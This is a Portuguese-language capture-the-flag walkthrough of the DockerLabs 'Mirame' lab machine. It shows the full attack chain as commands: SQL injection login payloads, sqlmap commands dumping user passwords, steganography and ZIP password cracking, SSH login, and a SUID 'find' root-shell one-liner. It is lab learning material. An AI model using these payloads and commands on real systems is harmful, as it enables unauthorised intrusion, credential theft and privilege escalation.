<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.mirame</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.mirame</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA MIRAME</span></strong></p><p></p><p><img src="images/154-1.png" alt="images/154-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/154-2.png" alt="images/154-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC  --open -p- -T5 -n -Pn          </span></strong><strong>                      </strong></p><p></p><p><img src="images/154-3.png" alt="images/154-3.png" /></p><p></p><p><strong>Verificando as portas podemos ver que temos duas postas abertas  a 22 e a 80. </strong></p><p></p><p><strong><span style="color:#ff7800;">22/tcp open  ssh     OpenSSH 9.2p1 Debian</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">80/tcp open  http    Apache httpd 2.4.61 ((Debian))</span></strong></p><p></p><p><strong>Vamos explorar na porta 80  através do ip da máquina pelo navegador  </strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><strong>Veja que temos uma pagina de login na porta 80</strong></p><p></p><p><img src="images/154-4.png" alt="images/154-4.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong><span style="color:#ff7800;"> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.py,.html</span></strong></p><p></p><p><img src="images/154-5.png" alt="images/154-5.png" /></p><p></p><p><strong>Achamos outra pagina </strong><strong><a href="http://172.17.0.2/page.php">http://172.17.0.2/page.php</a></strong></p><p></p><p><img src="images/154-6.png" alt="images/154-6.png" /></p><p></p><p><strong>Vamos fazer uma injeção de sql injection</strong> :</p><p></p><p><strong>usuario: </strong><strong><span style="color:#ff7800;">admin&#39; --</span></strong><strong></strong></p><p><strong>senha:</strong> <strong><span style="color:#ff7800;">&#39; OR &#39;1&#39;=&#39;1</span></strong></p><p></p><p><img src="images/154-7.png" alt="images/154-7.png" /></p><p></p><p><strong>Esse erro indica que o código no arquivo </strong><strong><code>auth.php</code></strong><strong> está tentando executar uma consulta SQL com uma entrada que causou um erro de sintaxe, provavelmente devido a um teste de injeção de SQL com </strong><strong><code>&#39;1&#39;=&#39;1&#39;</code></strong><strong>. Isso sugere que o campo de entrada não está sendo corretamente sanitizado antes de ser usado na consulta SQL, o que pode indicar uma vulnerabilidade de </strong><strong><span style="color:#ff7800;">injeção de SQL</span></strong><strong>.</strong></p><p></p><p><img src="images/154-8.png" alt="images/154-8.png" /></p><p></p><p><strong>Vamos usar o SQLmap para explorar automaticamente essa vulnerabilidade. A ferramenta SQLmap pode detectar e explorar injeções de SQL e também obter informações sobre o banco de dados, como nomes de tabelas e colunas.</strong></p><p></p><p><strong><span style="color:#ff7800;">sqlmap -u &quot;</span></strong><strong><a href="http://172.17.0.2/auth.php">http://172.17.0.2/auth.php</a></strong><strong><span style="color:#ff7800;">&quot; --data=&quot;username=admin&amp;password=test&quot; --dbs</span></strong></p><p></p><p><strong>Achamos : Information_Schema,  e users.</strong></p><p></p><p><img src="images/154-9.png" alt="images/154-9.png" /></p><p></p><p><strong>comando abaixo para ver as tabelas de </strong><strong><span style="color:#ff7800;">users</span></strong><strong>:</strong></p><p></p><p><strong>sqlmap -u &quot;</strong><strong><a href="http://172.17.0.2/auth.php">http://172.17.0.2/auth.php</a></strong><strong>&quot; --data=&quot;username=admin&amp;password=test&quot; -D users --tables</strong></p><p></p><p><strong>Achamos usuarios</strong></p><p></p><p><img src="images/154-10.png" alt="images/154-10.png" /></p><p></p><p><strong>comando abaixo para ver </strong> <strong>as colunas:</strong></p><p></p><p><strong><span style="color:#ff7800;">sqlmap -u &quot;</span></strong><strong><a href="http://172.17.0.2/auth.php">http://172.17.0.2/auth.php</a></strong><strong><span style="color:#ff7800;">&quot; --data=&quot;username=admin&amp;password=test&quot; -D users -T usuarios --columns</span></strong></p><p></p><p><strong>Achamos: id, password e username.</strong></p><p></p><p><img src="images/154-11.png" alt="images/154-11.png" /></p><p></p><p><strong>comando abaixo é para ver o para ver o: id, password e username.</strong></p><p></p><p><strong><span style="color:#ff7800;">sqlmap -u &quot;</span></strong><strong><a href="http://172.17.0.2/auth.php">http://172.17.0.2/auth.php</a></strong><strong><span style="color:#ff7800;">&quot; --data=&quot;username=admin&amp;password=test&quot; -D users -T usuarios -C password,username,id --dump</span></strong></p><p></p><p><table class="table"><tr><th>           password                            </th><th>  username </th><th>   id  </th></tr><tr><td>chocolateadministrador</td><td>  admin</td><td>  1</td></tr><tr><td>lucas</td><td>  lucas</td><td>  2</td></tr><tr><td>soyagustin123 </td><td>  agustin</td><td>  3</td></tr><tr><td>directoriotravieso</td><td> directorio</td><td>   4</td></tr><tr><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td></tr></table></p><p></p><p><img src="images/154-12.png" alt="images/154-12.png" /></p><p></p><p><strong>Vamos entrar no diretório que achamos conforme a imagem acima: </strong><strong><span style="color:#ff7800;">/directoriotravieso</span></strong></p><p></p><p><strong><a href="http://172.17.0.2/directoriotravieso/">http://172.17.0.2/directoriotravieso/</a></strong></p><p></p><p><img src="images/154-13.png" alt="images/154-13.png" /></p><p></p><p><img src="images/154-14.png" alt="images/154-14.png" /></p><p></p><p></p><p><strong><h3>Verifique Metadados da Imagem</h3></strong></p><p></p><p><strong>Muitos arquivos de imagem contêm metadados que podem revelar informações úteis, como o nome do autor, data de criação, localização, entre outros detalhes. Para ver os metadados, você pode usar o comando </strong><strong><span style="color:#ff7800;">exiftool </span></strong> <strong>e a</strong> <strong><span style="color:#ff7800;">steghide</span></strong>.</p><p></p><p><strong><span style="color:#ff7800;">exiftool miramebien.jpg</span></strong></p><p></p><p><img src="images/154-15.png" alt="images/154-15.png" /></p><p></p><p><strong><span style="color:#ff7800;">steghide extract -sf miramebien.jpg</span></strong></p><p></p><p><strong>não conseguimos usar a ferramenta porque esta pedindo uma senha.</strong></p><p></p><p><img src="images/154-16.png" alt="images/154-16.png" /></p><p></p><p><strong>Vamos usar a ferramenta </strong><strong><span style="color:#ff7800;">stegcracker</span></strong></p><p></p><p><img src="images/154-17.png" alt="images/154-17.png" /></p><p></p><p><strong><span style="color:#ff7800;">stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt </span></strong></p><p></p><p><strong><span style="color:#000000;">Achamos a senha</span></strong><strong><span style="color:#ff7800;"> chocolate</span></strong></p><p></p><p><img src="images/154-18.png" alt="images/154-18.png" /></p><p></p><p><strong>Vamos usar novamente a ferramenta </strong><strong><span style="color:#ff7800;">steghide</span></strong><strong> ja temos a senha </strong><strong><span style="color:#ff7800;">chocolate</span></strong><strong>.</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">steghide extract -sf miramebien.jpg </span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Achamos um arquivo “</strong><strong><span style="color:#ff7800;">ocultito.zip</span></strong><strong>”</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><img src="images/154-19.png" alt="images/154-19.png" /></p><p></p><p>Vamos usar a ferramenta <span style="color:#ff7800;">fcrackzip</span> para quebrar a senha.</p><p></p><p><span style="color:#ff7800;">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ocultito.zip</span></p><p></p><p>ACHAMOS A SENHA: <span style="color:#ff7800;">STUPID1</span></p><p></p><p><img src="images/154-20.png" alt="images/154-20.png" /></p><p></p><p><img src="images/154-21.png" alt="images/154-21.png" /></p><p></p><p><img src="images/154-22.png" alt="images/154-22.png" /></p><p></p><p><img src="images/154-23.png" alt="images/154-23.png" /></p><p></p><p>USAMOS O <span style="color:#ff7800;">UNZIP</span> NOVAMENTE E VAMOS COLOCAR A SENHA  <span style="color:#ff7800;">STUPID1</span>.</p><p></p><p><span style="color:#ff7800;">unzip ocultito.zip</span></p><p></p><p>Conseguimos ler o arquivo <span style="color:#ff7800;">secret.txt</span>, e temos :</p><p></p><p>usuário: <span style="color:#ff7800;">carlos</span></p><p>senha: <span style="color:#ff7800;">carlitos</span></p><p></p><p><img src="images/154-24.png" alt="images/154-24.png" /></p><p></p><p>Conseguimos entrar no <span style="color:#ff7800;">ssh </span>do usuário <span style="color:#ff7800;">carlos</span>.</p><p></p><p><span style="color:#ff7800;">ssh carlos@172.17.0.2</span></p><p></p><p><img src="images/154-25.png" alt="images/154-25.png" /></p><p></p><p>Vamos procurar por privilégios para ser usuário <span style="color:#ff7800;">root</span>, <span style="color:#ff7800;">sudo -l</span> nao conseguimos nada, vamos tentar com o comando <span style="color:#ff7800;">find</span>.</p><p></p><p> <span style="color:#ff7800;">find / -perm -4000 2&gt;/dev/null</span></p><p> </p><p><img src="images/154-26.png" alt="images/154-26.png" /> </p><p></p><p>Vamos para o site <a href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a>, e buscar por <span style="color:#ff7800;">find</span>.  </p><p></p><p><img src="images/154-27.png" alt="images/154-27.png" /></p><p></p><p><span style="color:#ff7800;">/usr/bin/find . -exec /bin/sh -p \; -quit</span></p><p></p><p><img src="images/154-28.png" alt="images/154-28.png" /></p><p></p><p><span style="color:#ff7800;">somos root</span></p><p></p><p><span style="color:#ff0000;">R10</span></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
